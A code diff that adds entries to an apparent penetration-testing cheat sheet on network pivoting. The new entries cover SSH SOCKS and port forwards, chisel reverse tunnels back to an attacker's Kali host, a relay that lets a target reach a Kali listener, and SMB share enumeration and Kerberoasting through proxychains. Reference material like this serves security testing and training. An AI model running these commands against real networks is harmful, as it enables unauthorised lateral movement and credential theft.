@@ -19,6 +19,13 @@ ipconfig /all; route print       # Windows
 # quick internal sweep from the host:
 for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                 },
+                {
+                    label: 'Routes + neighbours',
+                    code: `ip r; arp -a; cat /etc/hosts
+# Windows:
+ipconfig /all & route print & arp -a
+netstat -ano`,
+                },
             ],
             tags: ['pivot', 'dual-homed', 'subnet', 'internal'],
         },
@@ -34,6 +41,16 @@ for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                 {
                     label: 'Open the proxy',
                     code: 'ssh -D 1080 -N <user>@<pivot>   # then use proxychains',
+                },
+                {
+                    label: 'Background SOCKS',
+                    code: `ssh -D 1080 -N -f <user>@<pivot>
+# then proxychains / FoxyProxy -> 127.0.0.1:1080`,
+                },
+                {
+                    label: 'Keepalive + SOCKS5',
+                    code: `ssh -D 1080 -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 <user>@<pivot>
+# /etc/proxychains4.conf: socks5 127.0.0.1 1080`,
                 },
             ],
             tags: ['ssh', 'socks', 'dynamic', '-D'],
@@ -51,6 +68,16 @@ for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                     label: 'Forward one port',
                     code: 'ssh -L 8000:10.10.10.5:80 -N <user>@<pivot>   # http://127.0.0.1:8000',
                 },
+                {
+                    label: 'Forward a single internal port',
+                    code: `ssh -L 8080:<internal-ip>:80 -N <user>@<pivot>
+curl http://127.0.0.1:8080`,
+                },
+                {
+                    label: 'Multiple -L hops',
+                    code: `ssh -L 1433:<internal-ip>:1433 -L 8080:<internal-ip>:80 -N <user>@<pivot>
+# point tools at 127.0.0.1:1433 / :8080`,
+                },
             ],
             tags: ['ssh', '-L', 'local-forward'],
         },
@@ -66,6 +93,16 @@ for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
                 {
                     label: 'Reverse the tunnel',
                     code: 'ssh -R 1080 -N kali@<kali-ip>   # dynamic reverse SOCKS on Kali:1080',
+                },
+                {
+                    label: 'Expose Kali listener to the pivot LAN',
+                    code: `ssh -R 0.0.0.0:4444:127.0.0.1:443 -N <user>@<pivot>
+# target then connects to <pivot>:4444 -> Kali:443`,
+                },
+                {
+                    label: 'GatewayPorts if bind fails',
+                    code: `sshd -T | grep -i gatewayports
+# on the pivot: GatewayPorts yes in sshd_config, then restart sshd`,
                 },
             ],
             tags: ['ssh', '-R', 'remote-forward', 'reverse'],
@@ -86,6 +123,12 @@ for i in $(seq 1 254); do (ping -c1 -W1 10.10.10.$i | grep from &); done`,
 # target:
 chisel.exe client <kali-ip>:8080 R:socks`,
                 },
+                {
+                    label: 'Reverse port forward',
+                    code: `# Kali: ./chisel server -p 8080 --reverse
+# target:
+chisel.exe client <kali-ip>:8080 R:445:127.0.0.1:445`,
+                },
             ],
             tags: ['chisel', 'socks', 'windows', 'http-tunnel'],
         },
@@ -103,6 +146,11 @@ chisel.exe client <kali-ip>:8080 R:socks`,
                     code: `echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
 proxychains -q nmap -sT -Pn -p 445,3389,5985 10.10.10.5
 proxychains -q netexec smb 10.10.10.0/24`,
+                },
+                {
+                    label: 'Quiet AD through SOCKS',
+                    code: `proxychains -q netexec smb <internal-subnet>/24 -u <user> -p <pass> --shares
+proxychains -q impacket-GetUserSPNs -request -dc-ip <dc> <domain>/<user>`,
                 },
             ],
             tags: ['proxychains', 'socks', 'nmap', 'netexec'],
